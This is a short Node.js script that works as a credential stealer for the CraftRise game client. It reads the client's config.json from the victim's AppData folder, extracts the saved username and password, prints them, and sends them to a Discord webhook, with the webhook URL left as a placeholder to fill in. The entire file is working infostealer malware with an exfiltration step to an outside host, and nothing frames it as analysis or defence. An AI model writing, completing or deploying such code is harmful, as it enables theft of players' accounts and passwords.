const craftrise = require('./craftrise');
const WebhookSender = require('./webhook');
const os = require('os');
const path = require('path');

const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';

const configPath = path.join(os.homedir(), 'AppData', 'Roaming', '.craftrise', 'config.json');
const result = craftrise.set(configPath);

if (result) {
    console.log('Username:', result.username);
    console.log('Password:', result.password);

    const webhookSender = new WebhookSender(WEBHOOK_URL);
    webhookSender.sendCraftriseEmbed(result.username, result.password);
} else {
    console.error('Read failed.');
}